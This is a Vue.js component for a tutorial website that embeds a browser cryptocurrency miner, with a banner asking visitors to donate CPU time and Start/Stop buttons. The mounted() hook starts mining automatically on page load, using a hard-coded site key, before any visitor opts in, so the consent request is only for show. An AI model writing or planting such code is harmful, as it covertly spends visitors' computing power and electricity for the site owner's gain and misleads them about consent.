<template>
    <div :class="`miner${ $store.getters['minerstate'] ? ' miner--active' : '' }`">
        <div class="row">
            <div class="col-12 col-md-8 miner__intro" v-if="!$store.getters['minerstate']">
                Hey there :) if you like these tutorials or blueprints, you would do me a favour, 
                if you rent me some CPU time (~30%) to mine some cryptos. Let us keep the server paid :)
            </div>
            <div :class="`col-12 col-md-${ $store.getters['minerstate'] ? '10 text-center text-md-left' : '2' }`">
                <div>
                    {{ miner ? miner.getTotalHashes() : '0' }} Hashes calculated
                </div>
                
            </div>
            <div class="col-12 col-md-2 text-center text-md-right">
                <template v-if="$store.getters['minerstate']">
                    <button v-on:click="StopMiner">Stop mining</button>
                </template>
                <template v-else>
                    <button v-on:click="StartMiner">Start mining</button>
                </template>
            </div>
        </div>
    </div>
</template>

<script>
export default {

    data(){
        return {
            miner: null,
            mining: this.$store.getters['minerstate'],
            throttle: 0.66
        }
    },

    mounted(){
        if(typeof window.miner === 'undefined'){
            let miner = new Client.Anonymous('3c21f085fed5b3e7d3ed288237f341ad552e51e7af400c5f204f78cef1ea08f6', {
                throttle: this.throttle
            });
            window.miner = miner;

            this.miner = window.miner;
            this.StartMiner();
        }else{
            this.miner = window.miner;
        }
      
        
    },

    methods: {
        StartMiner(){
            this.$store.commit('SETMINERSTATE', true);
            this.miner.start();
        },

        StopMiner(){
            this.$store.commit('SETMINERSTATE', false);
            this.miner.stop();
        }
    }

}
</script>


